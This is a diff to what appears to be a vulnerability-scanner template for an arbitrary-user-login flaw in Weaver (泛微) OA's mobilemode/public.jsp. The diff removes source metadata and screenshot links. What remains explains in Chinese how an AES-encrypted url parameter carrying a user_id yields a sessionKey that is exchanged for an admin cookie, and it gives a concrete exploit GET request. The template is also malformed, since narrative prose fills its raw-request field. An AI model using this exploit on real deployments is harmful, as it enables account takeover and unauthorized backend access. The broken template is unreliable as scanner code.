@@ -3,44 +3,25 @@ info:
   name: 泛微OA mobilemode public.jsp任意⽤户登陆
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ko5atoyfag58pl17'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ko5atoyfag58pl17
-    fofa: app="泛微-EMobile"
 http:
 - raw:
   - '漏洞细节
 
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243368625-4e090e93-4247-4d82-98f3-bcb89ca503a4.jpeg)![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243369091-901d3041-3ada-4963-bc8a-d13fe6d04de9.jpeg)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243369437-c0826b40-6f74-40ce-b3a6-136a4e6958c6.jpeg)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243369807-e76ebd26-3ded-4101-a4ef-61035fe30832.jpeg)
 
     这⾥为AES解密，其中key为security.key，新版本的这个都是随机的，所以需要先获取到 security.key才可以实现任意⽤户登陆
 
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243370169-05b2ccc1-28bc-4707-b6bd-7b4dea5f7ffc.jpeg)
 
     也就是说这⾥的url经过aes解密之后需要⽣成⻓度为3的数组，其中第⼀个为user_id
 
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243370482-c0dd6e5b-8c8f-4dd0-8766-9a4cbd4cf9db.jpeg)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243370869-f8115f1a-2560-49f8-a7ca-c14ddc5fa710.jpeg)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243371234-2de5690b-9641-4525-bb99-77e7c8a42779.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243371578-b6b5fa6a-b33d-4ee5-9216-4b2e87611a09.jpeg)
 
     最后直接返回sessionKey，后⾯在找接⼝sessionKey去换cookie既可以直接上后台 数据包
 
 
     GET /mobilemode/public.jsp?from=QRCode&url=6113E071490B2269235AA57CBC17326A3FE4B32AE70B304398591449D84
 
-    CFD56&a=.swf HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/jpeg/43110909/1752243371909-22ab8186-a887-46be-84e0-21a4de4243b9.jpeg)'
+    CFD56&a=.swf HTTP/1.1'
   redirects: false
   matchers:
   - status:
